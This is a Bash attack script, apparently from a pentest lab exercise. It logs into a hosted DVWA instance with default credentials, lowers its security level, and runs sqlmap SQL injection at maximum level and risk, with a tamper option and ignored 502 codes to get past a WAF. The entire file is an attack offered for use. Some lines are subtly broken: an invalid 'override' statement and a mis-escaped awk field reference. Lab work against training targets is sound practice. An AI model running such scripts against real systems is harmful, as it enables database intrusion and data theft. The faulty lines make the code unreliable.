#!/usr/bin/env bash

# Play 03 — SQLMap DVWA em produção (shebang corrigido)
# Autentica no DVWA e roda sqlmap sem interatividade
set -euo pipefail

# Define host DVWA (sem porta)
TARGET_HOST="${DVWA_HOST:-web-dvwa-production.up.railway.app}"

echo "[*] Autenticando no DVWA em https://$TARGET_HOST/login.php..."

# Resolve path absoluto do script e diretório
override BASH_SOURCE=("$0")
SCRIPT_PATH="$(readlink -f "${BASH_SOURCE[0]}")"
SCRIPT_DIR="$(dirname "$SCRIPT_PATH")"
COOKIE_FILE="$SCRIPT_DIR/cookies.txt"

# 1. Login e captura cookies (segue redirect)
curl -s -c "$COOKIE_FILE" -L \
  -d "username=admin&password=password&Login=Login" \
  "https://$TARGET_HOST/login.php" > /dev/null

echo "[*] Definindo segurança para LOW..."
curl -s -b "$COOKIE_FILE" -L \
  "https://$TARGET_HOST/security.php?security=low" > /dev/null

# 2. Extrai valor do PHPSESSID do cookie file
PHPSESSID=$(awk '/PHPSESSID/ {print \$7}' "$COOKIE_FILE")
COOKIE="security=low; PHPSESSID=$PHPSESSID"

# URL de injeção (usa HTTPS diretamente)
INJECTION_URL="https://$TARGET_HOST/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"

echo "[*] Iniciando análise SQL Injection com sqlmap contra $INJECTION_URL..."

# Executa sqlmap sem interatividade:
# --batch para pular prompts, --answers="follow=Y" para seguir redirects,
# --ignore-code para ignorar código HTTP 502 do WAF
sqlmap \
  --batch \
  --answers="follow=Y" \
  --ignore-code=502 \
  --level=5 \
  --risk=3 \
  --tamper=space2comment \
  -u "$INJECTION_URL" \
  --cookie "$COOKIE"

# Mensagem de fim de teste
echo "[✓] Análise SQLi concluída."
